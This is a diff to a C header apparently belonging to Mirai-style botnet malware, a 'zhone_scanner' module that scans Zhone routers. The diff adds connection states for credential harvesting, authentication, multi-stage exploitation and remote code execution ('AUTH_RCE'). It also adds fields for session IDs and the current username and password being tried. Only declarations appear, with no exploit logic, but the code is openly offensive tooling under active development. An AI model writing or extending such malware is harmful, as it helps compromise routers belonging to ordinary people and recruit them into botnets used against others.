@@ -8,9 +8,18 @@
 
 #define ZHONE_SCANNER_MAX_CONNS   256
 #define ZHONE_SCANNER_RAW_PPS     788
-
-#define ZHONE_SCANNER_RDBUF_SIZE  1080
+#define ZHONE_SCANNER_RDBUF_SIZE  2048
 #define ZHONE_SCANNER_HACK_DRAIN  64
+
+/* Connection states */
+#define ZHONE_SC_CLOSED           0
+#define ZHONE_SC_CONNECTING       1
+#define ZHONE_SC_GET_CREDENTIALS  2
+#define ZHONE_SC_EXPLOIT_STAGE2   3
+#define ZHONE_SC_EXPLOIT_STAGE3   4
+#define ZHONE_SC_AUTHENTICATING   5
+#define ZHONE_SC_AUTHENTICATED    6
+#define ZHONE_SC_AUTH_RCE         7
 
 struct zhone_scanner_auth {
     char *username;
@@ -21,14 +30,7 @@ struct zhone_scanner_auth {
 struct zhone_scanner_connection
 {
     int fd, last_recv;
-    enum
-    {
-        ZHONE_SC_CLOSED,
-        ZHONE_SC_CONNECTING,
-        ZHONE_SC_GET_CREDENTIALS,
-        ZHONE_SC_EXPLOIT_STAGE2,
-        ZHONE_SC_EXPLOIT_STAGE3,
-    } state;
+    uint8_t state;
     ipv4_t dst_addr;
     uint16_t dst_port;
     int rdbuf_pos;
@@ -36,9 +38,13 @@ struct zhone_scanner_connection
     char **credentials;
     char payload_buf[5000], payload_buf2[5000];
     int credential_index;
+    char session_id[64];
+    uint8_t auth_attempted;
+    char current_user[32];
+    char current_pass[32];
 };
 
-void zhone_scanner_init();
+void zhone_scanner_init(void);
 void zhone_kill(void);
 
 static void zhone_setup_connection(struct zhone_scanner_connection *);
